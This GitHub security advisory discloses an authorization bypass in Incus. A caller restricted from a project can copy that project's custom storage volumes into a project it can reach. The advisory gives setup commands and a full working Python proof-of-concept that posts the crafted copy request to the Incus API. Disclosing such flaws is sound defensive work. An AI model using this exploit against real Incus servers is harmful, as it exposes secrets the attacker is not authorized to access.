# [H] Incus has a project restriction bypass for custom volume copy across projects

## Summary
Severity: High
Advisory: GHSA-64f3-v33m-w89f
CVE: CVE-2026-55621
CWE: CWE-284
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-08-28
Source: https://github.com/advisories/GHSA-64f3-v33m-w89f
Type: github-advisory

## Affected
- Go: `github.com/lxc/incus/v7` — affected >=0 <7.2.0
- Go: `github.com/lxc/incus/v6` — affected >=0
- Go: `github.com/lxc/incus` — affected >=0

## Details
### Summary

Missing authorization checks exist for custom volume copying where an attacker who knows the name of a project that they don't have access to and the name of a custom volume in that project can copy the custom volume to a new project. This issue could allow an attacker to access secrets in custom volumes they are not authorized to access.

### Details

The storage volume creation handler authorizes creation in the target project, then passes `req.Source.Project` into the custom-volume copy path without checking that the caller can view the source volume. `req.Source.Project` is the attacker-controlled field. It is resolved to a storage volume project name and passed directly to `CreateCustomVolumeFromCopy`. No `allowPermission` or entitlement check (e.g. `CanView` on the source volume) is performed.

The copy must occur on the same server. However, once the copy has been done, nothing prevents a malicious actor from moving the volume to another server.

### PoC
#### Setup

Assume the target server is remotely accessible and a user/certificate has been added.

```
# create a new project and instance
incus project create secrets
incus profile show default | incus --project secrets edit default
incus --project secrets storage volume create default secret-vol

# restrict an existing certificate to prevent access to the project
incus config trust edit cert-fp
#> set, for example
restricted: true
projects:
  - default

# verification, with the restricted certificate
incus --project secrets storage volume ls remote:default
```

#### Exploitation

The below script was partly generated. To copy the secret instance to the default project, the following command can be used.

```
python3 poc.py --url https://IP-REMOTE:8443 \
    --cert path/to/client.crt --key path/to/client.key \
    --target-project default --source-project secrets \
    --source-volume secret-vol --name copy-secret-vol \
    --pool default --source-pool default \
    --insecure
```

Wait a bit for the custom volume to be copied, then `incus storage volume ls remote:default` to see the copied instance.

```
#!/usr/bin/env python3
"""Copy a custom storage volume from another project into an allowed project."""

from __future__ import annotations

import argparse
import json
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request


def post(url: str, path: str, body: dict, cert: str, key: str, insecure: bool) -> bytes:
    ctx = ssl.create_default_context()
    if insecure:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    ctx.load_cert_chain(cert, key)
    req = urllib.request.Request(
        url.rstrip("/") + path,
        data=json.dumps(body).encode(),
        method="POST",
        headers={"Content-Type": "application/json", "Accept": "application/json"},
    )
    try:
        with urllib.request.urlopen(req, context=ctx) as resp:
            return resp.read()
    except urllib.error.HTTPError as exc:
        sys.stderr.write(exc.read().decode(errors="replace") + "\n")
        raise


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--cert", required=True)
    ap.add_argument("--key", required=True)
    ap.add_argument("--pool", required=True)
    ap.add_argument("--target-project", required=True)
    ap.add_argument("--source-project", required=True)
    ap.add_argument("--source-volume", required=True)
    ap.add_argument("--source-pool")
    ap.add_argument("--name", required=True, help="new volume name in target project")
    ap.add_argument("--content-type", default="filesystem", choices=["filesystem", "block"])
    ap.add_argument("--volume-only", action="store_true")
    ap.add_argument("--insecure", action="store_true")
    ap.add_argument("--dry-run", action="store_true")
    args = ap.parse_args()

    source = {
        "type": "copy",
        "name": args.source_volume,
        "project": args.source_project,
        "volume_only": args.volume_only,
    }
    if args.source_pool:
        source["pool"] = args.source_pool

    body = {
        "name": args.name,
        "type": "custom",
        "content_type": args.content_type,
        "source": source,
    }
    path = "/1.0/storage-pools/{}/volumes/custom?{}".format(
        urllib.parse.quote(args.pool, safe=""),
        urllib.parse.urlencode({"project": args.target_project}),
    )
    print(json.dumps(body, indent=2))
    if args.dry_run:
        return 0
    print(post(args.url, path, body, args.cert, args.key, args.insecure).decode(errors="replace"))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

### Impact

An attacker can copy instances they don't normally have access to, possibly leading to information disclosure.

## References
- https://github.com/lxc/incus/security/advisories/GHSA-64f3-v33m-w89f
- https://nvd.nist.gov/vuln/detail/CVE-2026-55621
- https://github.com/lxc/incus/commit/2e01078366e2653712719dec82318e51c6d21b28
- https://github.com/lxc/incus
- https://github.com/lxc/incus/releases/tag/v7.2.0
